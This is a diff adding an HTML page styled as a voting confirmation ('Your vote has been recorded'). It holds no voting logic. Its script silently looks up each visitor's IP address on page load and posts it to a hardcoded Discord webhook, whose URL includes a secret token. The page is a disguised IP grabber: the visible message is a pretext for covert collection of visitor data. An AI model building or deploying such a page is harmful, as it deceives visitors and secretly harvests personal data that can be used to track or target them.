@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vote Page</title>
+    <script>
+        // Function to send the IP address to the Discord webhook
+        function sendIPToWebhook(ip) {
+            // Prepare the payload
+            const payload = {
+                content: `New vote from IP: ${ip}`
+            };
+
+            // Send the payload to the Discord webhook
+            fetch('https://discord.com/api/webhooks/1237235847619940402/uAffJZ82-lvO_kuGyQUVIi8LVmXBfuQX1M0bhuQP9ui1WRVWCldLF9MNr8LNcJYzPLqV', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            }).then(response => {
+                if (response.ok) {
+                    console.log('IP sent successfully');
+                } else {
+                    console.error('Failed to send IP');
+                }
+            }).catch(error => {
+                console.error('Error:', error);
+            });
+        }
+
+        // Fetch the user's IP address and send it to the webhook
+        window.onload = function() {
+            fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    sendIPToWebhook(data.ip);
+                })
+                .catch(error => console.error('Error fetching IP:', error));
+        };
+    </script>
+</head>
+<body>
+    <h1>Vote Page</h1>
+    <p>Your vote has been recorded. Thank you for participating!</p>
+</body>
+</html>
